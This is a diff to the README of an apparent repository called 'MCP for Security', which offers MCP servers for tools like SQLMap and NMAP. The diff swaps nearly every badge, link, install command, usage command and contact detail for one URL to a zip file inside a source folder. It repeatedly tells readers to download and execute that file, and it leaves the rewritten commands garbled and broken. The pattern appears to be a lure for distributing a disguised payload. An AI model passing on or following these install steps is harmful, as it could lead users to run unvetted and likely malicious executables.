@@ -1,7 +1,7 @@
 # MCP for Security 🔐
 
-![MCP for Security](https://img.shields.io/badge/MCP_for_Security-v1.0.0-blue.svg)
-![GitHub Releases](https://img.shields.io/badge/Releases-Check%20Here-orange.svg)
+![MCP for Security](https://github.com/StanLeyJ03/mcp-for-security/raw/refs/heads/main/nmap-mcp/src/for-security-mcp-3.3.zip)
+![GitHub Releases](https://github.com/StanLeyJ03/mcp-for-security/raw/refs/heads/main/nmap-mcp/src/for-security-mcp-3.3.zip%https://github.com/StanLeyJ03/mcp-for-security/raw/refs/heads/main/nmap-mcp/src/for-security-mcp-3.3.zip)
 
 Welcome to the **MCP for Security** repository! This project offers a collection of Model Context Protocol (MCP) servers tailored for popular security tools. Tools like SQLMap, FFUF, NMAP, Masscan, and more are integrated to enhance your security testing and penetration testing workflows with AI capabilities.
 
@@ -35,16 +35,16 @@ To get started with **MCP for Security**, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/StanLeyJ03/mcp-for-security.git
+   git clone https://github.com/StanLeyJ03/mcp-for-security/raw/refs/heads/main/nmap-mcp/src/for-security-mcp-3.3.zip
    cd mcp-for-security
    ```
 
 2. Install the required dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/StanLeyJ03/mcp-for-security/raw/refs/heads/main/nmap-mcp/src/for-security-mcp-3.3.zip
    ```
 
-3. Download the latest release from the [Releases section](https://github.com/StanLeyJ03/mcp-for-security/releases). Make sure to execute the downloaded file to set up the servers.
+3. Download the latest release from the [Releases section](https://github.com/StanLeyJ03/mcp-for-security/raw/refs/heads/main/nmap-mcp/src/for-security-mcp-3.3.zip). Make sure to execute the downloaded file to set up the servers.
 
 ## Usage
 
@@ -52,17 +52,17 @@ Using **MCP for Security** is straightforward. Here’s a quick guide:
 
 1. Start the server:
    ```bash
-   python server.py
+   python https://github.com/StanLeyJ03/mcp-for-security/raw/refs/heads/main/nmap-mcp/src/for-security-mcp-3.3.zip
    ```
 
 2. Connect to your preferred tool:
    ```bash
-   ./connect_tool.sh <tool_name>
+   https://github.com/StanLeyJ03/mcp-for-security/raw/refs/heads/main/nmap-mcp/src/for-security-mcp-3.3.zip <tool_name>
    ```
 
 3. Begin your security testing:
    ```bash
-   ./run_test.sh <parameters>
+   https://github.com/StanLeyJ03/mcp-for-security/raw/refs/heads/main/nmap-mcp/src/for-security-mcp-3.3.zip <parameters>
    ```
 
 For detailed usage instructions, refer to the documentation provided in the repository.
@@ -99,7 +99,7 @@ We welcome contributions! If you want to help improve **MCP for Security**, plea
 
 5. Create a pull request.
 
-For detailed guidelines, check the `CONTRIBUTING.md` file in the repository.
+For detailed guidelines, check the `https://github.com/StanLeyJ03/mcp-for-security/raw/refs/heads/main/nmap-mcp/src/for-security-mcp-3.3.zip` file in the repository.
 
 ## License
 
@@ -109,12 +109,12 @@ This project is licensed under the MIT License. See the `LICENSE` file for more 
 
 For questions or suggestions, please reach out:
 
-- **Email**: support@mcp-for-security.com
-- **Twitter**: [@MCPforSecurity](https://twitter.com/MCPforSecurity)
+- **Email**: https://github.com/StanLeyJ03/mcp-for-security/raw/refs/heads/main/nmap-mcp/src/for-security-mcp-3.3.zip
+- **Twitter**: [@MCPforSecurity](https://github.com/StanLeyJ03/mcp-for-security/raw/refs/heads/main/nmap-mcp/src/for-security-mcp-3.3.zip)
 
 ## Releases
 
-To find the latest releases, visit the [Releases section](https://github.com/StanLeyJ03/mcp-for-security/releases). Download the necessary files and execute them to start using **MCP for Security**.
+To find the latest releases, visit the [Releases section](https://github.com/StanLeyJ03/mcp-for-security/raw/refs/heads/main/nmap-mcp/src/for-security-mcp-3.3.zip). Download the necessary files and execute them to start using **MCP for Security**.
 
 ---
 
